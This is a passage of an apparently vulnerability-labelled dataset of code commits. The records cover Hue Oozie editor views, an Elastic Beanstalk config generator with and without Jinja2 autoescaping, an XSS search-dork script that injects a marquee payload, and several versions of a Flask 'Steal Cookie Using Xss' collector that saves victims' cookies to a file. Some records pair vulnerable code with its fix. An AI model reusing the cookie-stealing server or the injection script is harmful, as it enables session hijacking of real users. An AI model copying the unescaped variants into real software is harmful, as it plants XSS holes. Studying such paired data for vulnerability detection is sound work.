    raise PopupException(_(""Error submitting coordinator %s"") % (coordinator,),
                         detail=ex._headers.get('oozie-error-message', ex))
    
    
    

def list_editor_bundles(request):
  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]

  return render('editor/list_editor_bundles.mako', request, {
      'bundles': bundles
  })


@check_document_access_permission()
def edit_bundle(request):
  bundle_id = request.GET.get('bundle')
  doc = None
  
  if bundle_id:
    doc = Document2.objects.get(id=bundle_id)
    bundle = Bundle(document=doc)
  else:
    bundle = Bundle()

  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/bundle_editor.mako', request, {
      'bundle_json': bundle.json_for_html(),
      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      
  })


def new_bundle(request):
  return edit_bundle(request)


@check_document_modify_permission()
def save_bundle(request):
  response = {'status': -1}

  bundle_data = json.loads(request.POST.get('bundle', '{}'))

  if bundle_data.get('id'):
    bundle_doc = Document2.objects.get(id=bundle_data['id'])
  else:      
    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)
    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')

  if bundle_data['coordinators']:
    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)    
    bundle_doc.dependencies = dependencies

  bundle_doc.update_data(bundle_data)
  bundle_doc.name = bundle_data['name']
  bundle_doc.save()
  
  response['status'] = 0
  response['id'] = bundle_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_bundle(request, doc_id):
  bundle = Bundle(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_bundle(request, bundle, mapping)

      request.info(_('Bundle submitted.'))
      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = bundle.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_bundle(request, bundle, properties):
  try:
    deployment_mapping = {}
    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])
    
    for i, bundled in enumerate(bundle.data['coordinators']):
      coord = coords[bundled['coordinator']]
      workflow = Workflow(document=coord.dependencies.all()[0])
      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      
      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)
      
      coordinator = Coordinator(document=coord)
      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()
      deployment_mapping['coord_%s_dir' % i] = coord_dir
      deployment_mapping['coord_%s' % i] = coord

    properties.update(deployment_mapping)
    
    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting bundle %s"") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))

/n/n/n",0
105,6641c62beaa1468082e47d82da5ed758d11c7735,"/apps/oozie/src/oozie/views/editor2.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging
import uuid

from django.core.urlresolvers import reverse
from django.forms.formsets import formset_factory
from django.http import HttpResponse
from django.shortcuts import redirect
from django.utils.translation import ugettext as _

from desktop.lib.django_util import render
from desktop.lib.exceptions_renderable import PopupException
from desktop.lib.i18n import smart_str
from desktop.lib.rest.http_client import RestException
from desktop.models import Document, Document2

from liboozie.credentials import Credentials
from liboozie.oozie_api import get_oozie
from liboozie.submission2 import Submission

from oozie.decorators import check_document_access_permission, check_document_modify_permission
from oozie.forms import ParameterForm
from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\
    find_dollar_variables, find_dollar_braced_variables


LOG = logging.getLogger(__name__)



def list_editor_workflows(request):  
  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  return render('editor/list_editor_workflows.mako', request, {
      'workflows_json': json.dumps(workflows)
  })


@check_document_access_permission()
def edit_workflow(request):
  workflow_id = request.GET.get('workflow')
  
  if workflow_id:
    wid = {}
    if workflow_id.isdigit():
      wid['id'] = workflow_id
    else:
      wid['uuid'] = workflow_id
    doc = Document2.objects.get(type='oozie-workflow2', **wid)
    workflow = Workflow(document=doc)
  else:
    doc = None
    workflow = Workflow()
    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)
  
  workflow_data = workflow.get_data()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  return render('editor/workflow_editor.mako', request, {
      'layout_json': json.dumps(workflow_data['layout']),
      'workflow_json': json.dumps(workflow_data['workflow']),
      'credentials_json': json.dumps(credentials.credentials.keys()),
      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),
      'doc1_id': doc.doc.get().id if doc else -1,
      'subworkflows_json': json.dumps(_get_workflows(request.user)),
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_workflow(request):
  return edit_workflow(request)


def delete_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(id=job['id'])
    doc = doc2.doc.get()
    doc.can_write_or_exception(request.user)
    
    doc.delete()
    doc2.delete()

  response = {}
  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def copy_workflow(request):
  if request.method != 'POST':
    raise PopupException(_('A POST request is required.'))

  jobs = json.loads(request.POST.get('selection'))

  for job in jobs:
    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])
    
    name = doc2.name + '-copy'
    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)
  
    doc2.pk = None
    doc2.id = None
    doc2.uuid = str(uuid.uuid4())
    doc2.name = name
    doc2.owner = request.user    
    doc2.save()
  
    doc2.doc.all().delete()
    doc2.doc.add(copy_doc)
    
    workflow = Workflow(document=doc2)
    workflow.update_name(name)
    doc2.update_data({'workflow': workflow.get_data()['workflow']})
    doc2.save()

    workflow.set_workspace(request.user)
    workflow.check_workspace(request.fs, request.user)

  response = {}  
  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_modify_permission()
def save_workflow(request):
  response = {'status': -1}

  workflow = json.loads(request.POST.get('workflow', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  if workflow.get('id'):
    workflow_doc = Document2.objects.get(id=workflow['id'])
  else:      
    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)
    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')

  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']
  if subworkflows:
    dependencies = Document2.objects.filter(uuid__in=subworkflows)
    workflow_doc.dependencies = dependencies

  workflow_doc.update_data({'workflow': workflow})
  workflow_doc.update_data({'layout': layout})
  workflow_doc.name = workflow['name']
  workflow_doc.save()
  
  workflow_instance = Workflow(document=workflow_doc)
  
  response['status'] = 0
  response['id'] = workflow_doc.id
  response['doc1_id'] = workflow_doc.doc.get().id
  response['message'] = _('Page saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def new_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))

  properties = NODES[node['widgetType']].get_mandatory_fields()
  workflows = []

  if node['widgetType'] == 'subworkflow-widget':
    workflows = _get_workflows(request.user)

  response['status'] = 0
  response['properties'] = properties 
  response['workflows'] = workflows
  
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def _get_workflows(user):
  return [{
        'name': workflow.name,
        'owner': workflow.owner.username,
        'value': workflow.uuid,
        'id': workflow.id
      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]
    ]  


def add_node(request):
  response = {'status': -1}

  node = json.loads(request.POST.get('node', '{}'))
  properties = json.loads(request.POST.get('properties', '{}'))
  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))

  _properties = dict(NODES[node['widgetType']].get_fields())
  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))

  if copied_properties:
    _properties.update(copied_properties)

  response['status'] = 0
  response['properties'] = _properties
  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def action_parameters(request):
  response = {'status': -1}
  parameters = set()

  try:
    node_data = json.loads(request.POST.get('node', '{}'))
    
    parameters = parameters.union(set(Node(node_data).find_parameters()))
    
    script_path = node_data.get('properties', {}).get('script_path', {})
    if script_path:
      script_path = script_path.replace('hdfs://', '')

      if request.fs.do_as_user(request.user, request.fs.exists, script_path):
        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  

        if node_data['type'] in ('hive', 'hive2'):
          parameters = parameters.union(set(find_dollar_braced_variables(data)))
        elif node_data['type'] == 'pig':
          parameters = parameters.union(set(find_dollar_variables(data)))
                
    response['status'] = 0
    response['parameters'] = list(parameters)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def workflow_parameters(request):
  response = {'status': -1}

  try:
    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) 

    response['status'] = 0
    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_workflow(request):
  response = {'status': -1}

  try:
    workflow_json = json.loads(request.POST.get('workflow', '{}'))
  
    workflow = Workflow(workflow=workflow_json)
  
    response['status'] = 0
    response['xml'] = workflow.to_xml()
  except Exception, e:
    response['message'] = str(e)
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_workflow(request, doc_id):
  workflow = Workflow(document=Document2.objects.get(id=doc_id))
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)    

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])

      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)

      request.info(_('Workflow submitted'))
      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = workflow.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

    popup = render('editor/submit_job_popup.mako', request, {
                     'params_form': params_form,
                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})
                   }, force_template=True).content
    return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_workflow(user, fs, jt, workflow, mapping):
  try:
    submission = Submission(user, workflow, fs, jt, mapping)
    job_id = submission.run()
    return job_id
  except RestException, ex:
    detail = ex._headers.get('oozie-error-message', ex)
    if 'Max retries exceeded with url' in str(detail):
      detail = '%s: %s' % (_('The Oozie server is not running'), detail)
    LOG.error(smart_str(detail))
    raise PopupException(_(""Error submitting workflow %s"") % (workflow,), detail=detail)

  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))



def list_editor_coordinators(request):
  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/list_editor_coordinators.mako', request, {
      'coordinators': coordinators
  })


@check_document_access_permission()
def edit_coordinator(request):
  coordinator_id = request.GET.get('coordinator')
  doc = None
  
  if coordinator_id:
    doc = Document2.objects.get(id=coordinator_id)
    coordinator = Coordinator(document=doc)
  else:
    coordinator = Coordinator()

  api = get_oozie(request.user)
  credentials = Credentials()
  
  try:  
    credentials.fetch(api)
  except Exception, e:
    LOG.error(smart_str(e))

  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]

  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):
    raise PopupException(_('You don\'t have access to the workflow of this coordinator.'))

  return render('editor/coordinator_editor.mako', request, {
      'coordinator_json': coordinator.json,
      'credentials_json': json.dumps(credentials.credentials.keys()),
      'workflows_json': json.dumps(workflows),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))
  })


def new_coordinator(request):
  return edit_coordinator(request)


@check_document_modify_permission()
def save_coordinator(request):
  response = {'status': -1}

  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))

  if coordinator_data.get('id'):
    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])
  else:      
    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)
    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')

  if coordinator_data['properties']['workflow']:
    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)
    coordinator_doc.dependencies = dependencies

  coordinator_doc.update_data(coordinator_data)
  coordinator_doc.name = coordinator_data['name']
  coordinator_doc.save()
  
  response['status'] = 0
  response['id'] = coordinator_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


def gen_xml_coordinator(request):
  response = {'status': -1}

  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))

  coordinator = Coordinator(data=coordinator_dict)

  response['status'] = 0
  response['xml'] = coordinator.to_xml()
    
  return HttpResponse(json.dumps(response), mimetype=""application/json"") 


@check_document_access_permission()
def submit_coordinator(request, doc_id):
  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_coordinator(request, coordinator, mapping)

      request.info(_('Coordinator submitted.'))
      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = coordinator.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_coordinator(request, coordinator, mapping):
  try:
    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])
    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()

    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}
    properties.update(mapping)

    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting coordinator %s"") % (coordinator,),
                         detail=ex._headers.get('oozie-error-message', ex))
    
    
    

def list_editor_bundles(request):
  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]

  return render('editor/list_editor_bundles.mako', request, {
      'bundles': bundles
  })


@check_document_access_permission()
def edit_bundle(request):
  bundle_id = request.GET.get('bundle')
  doc = None
  
  if bundle_id:
    doc = Document2.objects.get(id=bundle_id)
    bundle = Bundle(document=doc)
  else:
    bundle = Bundle()

  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])
                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]

  return render('editor/bundle_editor.mako', request, {
      'bundle_json': bundle.json,
      'coordinators_json': json.dumps(coordinators),
      'doc1_id': doc.doc.get().id if doc else -1,
      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      
  })


def new_bundle(request):
  return edit_bundle(request)


@check_document_modify_permission()
def save_bundle(request):
  response = {'status': -1}

  bundle_data = json.loads(request.POST.get('bundle', '{}'))

  if bundle_data.get('id'):
    bundle_doc = Document2.objects.get(id=bundle_data['id'])
  else:      
    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)
    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')

  if bundle_data['coordinators']:
    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])
    for doc in dependencies:
      doc.doc.get().can_read_or_exception(request.user)    
    bundle_doc.dependencies = dependencies

  bundle_doc.update_data(bundle_data)
  bundle_doc.name = bundle_data['name']
  bundle_doc.save()
  
  response['status'] = 0
  response['id'] = bundle_doc.id
  response['message'] = _('Saved !')

  return HttpResponse(json.dumps(response), mimetype=""application/json"")


@check_document_access_permission()
def submit_bundle(request, doc_id):
  bundle = Bundle(document=Document2.objects.get(id=doc_id))  
  ParametersFormSet = formset_factory(ParameterForm, extra=0)

  if request.method == 'POST':
    params_form = ParametersFormSet(request.POST)

    if params_form.is_valid():
      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])
      job_id = _submit_bundle(request, bundle, mapping)

      request.info(_('Bundle submitted.'))
      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))
    else:
      request.error(_('Invalid submission form: %s' % params_form.errors))
  else:
    parameters = bundle.find_all_parameters()
    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))
    params_form = ParametersFormSet(initial=initial_params)

  popup = render('editor/submit_job_popup.mako', request, {
                 'params_form': params_form,
                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})
                }, force_template=True).content
  return HttpResponse(json.dumps(popup), mimetype=""application/json"")


def _submit_bundle(request, bundle, properties):
  try:
    deployment_mapping = {}
    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])
    
    for i, bundled in enumerate(bundle.data['coordinators']):
      coord = coords[bundled['coordinator']]
      workflow = Workflow(document=coord.dependencies.all()[0])
      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      
      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)
      
      coordinator = Coordinator(document=coord)
      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()
      deployment_mapping['coord_%s_dir' % i] = coord_dir
      deployment_mapping['coord_%s' % i] = coord

    properties.update(deployment_mapping)
    
    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)
    job_id = submission.run()

    return job_id
  except RestException, ex:
    raise PopupException(_(""Error submitting bundle %s"") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))

/n/n/n",1
106,8c40c66ea7c483a0cbda4c21940180af909aab99,"utils/make_eb_config.py/n/nimport os
import argparse
from jinja2 import Environment, FileSystemLoader


def make_eb_config(application_name, default_region):
    # Capture our current directory
    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))
    # Create the jinja2 environment.
    # Notice the use of trim_blocks, which greatly helps control whitespace.
    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)
    return j2_env.get_template('templates/eb/config.yml').render(
        APPLICATION_NAME=application_name,
        DEFAULT_REGION=default_region
    )


def write_eb_config(dest, application_name, default_region):
    contents = make_eb_config(application_name, default_region)
    fh = open(dest, 'w')
    fh.write(contents)
    fh.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='EB Config Maker')
    # Optional argument
    parser.add_argument('--dest', type=str,
                        help='The destination of the generated eb config',
                        default='./.elasticbeanstalk/config.yml')

    parser.add_argument('--name', type=str,
                        required=True,
                        help='The name of the application')

    parser.add_argument('--region', type=str,
                        required=True,
                        help='The default application region')

    args = parser.parse_args()

    write_eb_config(args.dest, application_name=args.name, default_region=args.region)
/n/n/n",0
107,8c40c66ea7c483a0cbda4c21940180af909aab99,"/utils/make_eb_config.py/n/nimport os
import argparse
from jinja2 import Environment, FileSystemLoader


def make_eb_config(application_name, default_region):
    # Capture our current directory
    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))
    # Create the jinja2 environment.
    # Notice the use of trim_blocks, which greatly helps control whitespace.
    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))
    return j2_env.get_template('templates/eb/config.yml').render(
        APPLICATION_NAME=application_name,
        DEFAULT_REGION=default_region
    )


def write_eb_config(dest, application_name, default_region):
    contents = make_eb_config(application_name, default_region)
    fh = open(dest, 'w')
    fh.write(contents)
    fh.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='EB Config Maker')
    # Optional argument
    parser.add_argument('--dest', type=str,
                        help='The destination of the generated eb config',
                        default='./.elasticbeanstalk/config.yml')

    parser.add_argument('--name', type=str,
                        required=True,
                        help='The name of the application')

    parser.add_argument('--region', type=str,
                        required=True,
                        help='The default application region')

    args = parser.parse_args()

    write_eb_config(args.dest, application_name=args.name, default_region=args.region)
/n/n/n",1
108,6b303259f62432bcb323721f038b4396e356ff6f,"content/xss.py/n/nimport urllib3 as url
from pyquery import PyQuery
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input(""[Input Dork] >_ ""))
        req = url.PoolManager()
        send = req.request(""GET"", ""http://www1.search-results.com/web?q="" + user_dork + ""&page="" + str(page))
        parser = BeautifulSoup(send.data, features=""lxml"")
        for link in parser.find_all('cite'):
            result = link.string
            x = str(input(""[Input Script] >_ ""))
            print(str(result) + ""'"" + ""<marquee style='background:red'>"" + x + ""</marquee>"")
/n/n/n",0
109,6b303259f62432bcb323721f038b4396e356ff6f,"/content/xss.py/n/nimport urllib3 as url
from pyquery import PyQuery
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input(""[Input Dork] >_ ""))
        req = url.PoolManager()
        for page in range(4):
            send = req.request(""GET"", ""http://www1.search-results.com/web?q="" + user_dork + ""&page="" + str(page))
            parser = BeautifulSoup(send.data, features=""lxml"")
            for link in parser.find_all('cite'):
                result = link.string
                x = str(input(""[Input Script] >_ ""))
                print(str(result) + ""'"" + ""<marquee style='background:red'>"" + x + ""</marquee>"")
/n/n/n",1
110,9bb7a1ac857c2dce57118beb79bb3a343f6b51ec,"content/xss.py/n/nimport urllib3 as url
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input(""[Input Dork] >_ ""))
        req = url.PoolManager()
        send = req.request(""GET"", ""http://www1.search-results.com/web?q="" + user_dork)
        parser = BeautifulSoup(send.data, features=""html.parser"")
        x = str(input(""[Message] >_ ""))
        print(""[+] Here's the result ! \n"")
        print(""-----------------------------------------"")
        for link in parser.find_all('cite'):
            result = link.string
            print(""[+] > "" + str(result) + ""'"" + ""<marquee style='background:red'>"" + x + ""</marquee>"")

        print(""-----------------------------------------"")
/n/n/n",0
111,9bb7a1ac857c2dce57118beb79bb3a343f6b51ec,"/content/xss.py/n/nimport urllib3 as url
from pyquery import PyQuery
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input(""[Input Dork] >_ ""))
        req = url.PoolManager()
        send = req.request(""GET"", ""http://www1.search-results.com/web?q="" + user_dork + ""&page="" + str(page))
        parser = BeautifulSoup(send.data, features=""lxml"")
        for link in parser.find_all('cite'):
            result = link.string
            x = str(input(""[Input Script] >_ ""))
            print(str(result) + ""'"" + ""<marquee style='background:red'>"" + x + ""</marquee>"")
/n/n/n",1
112,f89875a106cac251e066535823c3fada522a7ae1,"xss.py/n/nfrom flask import Flask,request
from termcolor import colored
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0
113,f89875a106cac251e066535823c3fada522a7ae1,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
app = Flask(__name__)
@app.route('/')
def index():
	return 'steal cookie :) '
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1
114,33993d2dca4259e574211b8fa84032894b278bb0,"xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0
115,33993d2dca4259e574211b8fa84032894b278bb0,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n\n')
print(colored('\n\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1
116,d20b8de6b838a490155218b2306c87f6060713a6,"xss.py/n/ntry:
	from flask import Flask,request
	from termcolor import colored
	from time import sleep
except:
	print('[!] Install The Modules .. ')
	import os
	os.system('pip install flask')
	os.system('pip install termcolor')
	os.system('pip install time')
	sys.exit()
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0
117,d20b8de6b838a490155218b2306c87f6060713a6,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
